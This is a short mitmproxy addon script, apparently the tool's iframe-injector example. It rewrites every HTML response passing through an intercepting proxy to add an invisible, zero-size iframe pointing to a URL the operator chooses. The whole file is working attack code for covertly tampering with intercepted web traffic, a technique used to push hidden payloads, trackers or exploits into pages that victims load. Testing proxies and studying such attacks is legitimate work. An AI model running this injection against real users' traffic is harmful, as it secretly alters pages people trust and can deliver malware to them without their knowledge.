# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
import sys
from bs4 import BeautifulSoup
from mitmproxy.models import decoded

iframe_url = None


def start():
    if len(sys.argv) != 2:
        raise ValueError('Usage: -s "iframe_injector.py url"')
    global iframe_url
    iframe_url = sys.argv[1]


def response(flow):
    if flow.request.host in iframe_url:
        return
    with decoded(flow.response):  # Remove content encoding (gzip, ...)
        html = BeautifulSoup(flow.response.content, "lxml")
        if html.body:
            iframe = html.new_tag(
                "iframe",
                src=iframe_url,
                frameborder=0,
                height=0,
                width=0)
            html.body.insert(0, iframe)
            flow.response.content = str(html).encode("utf8")
